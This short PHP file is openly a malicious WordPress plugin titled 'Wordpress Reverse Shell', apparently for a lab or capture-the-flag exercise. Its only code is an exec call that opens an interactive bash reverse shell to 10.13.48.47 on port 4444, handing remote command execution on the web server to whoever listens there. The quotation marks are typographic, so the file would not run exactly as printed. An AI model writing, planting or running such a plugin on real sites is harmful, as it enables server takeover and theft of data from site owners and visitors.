<?php
/**
 * Plugin Name: Wordpress Reverse Shell
 * Author: azkrath
 */
exec(“/bin/bash -c ‘bash -i >& /dev/tcp/10.13.48.47/4444 0>&1’”)
?>
